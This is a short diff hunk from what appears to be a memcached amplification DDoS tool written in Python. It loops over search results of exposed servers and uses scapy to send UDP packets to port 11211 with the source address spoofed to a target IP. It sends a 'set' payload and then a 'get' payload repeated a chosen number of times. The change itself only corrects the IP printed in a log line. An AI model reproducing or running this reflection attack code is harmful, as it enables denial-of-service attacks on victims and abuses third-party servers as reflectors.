@@ -136,7 +136,7 @@ while True:
                 else:
                     for result in results['matches']:
                         if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
-                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
+                            print('[+] Sending 2 forged synchronized payloads to: %s' % (result['ip_str']))
                             with suppress_stdout():
                                 send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                 send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
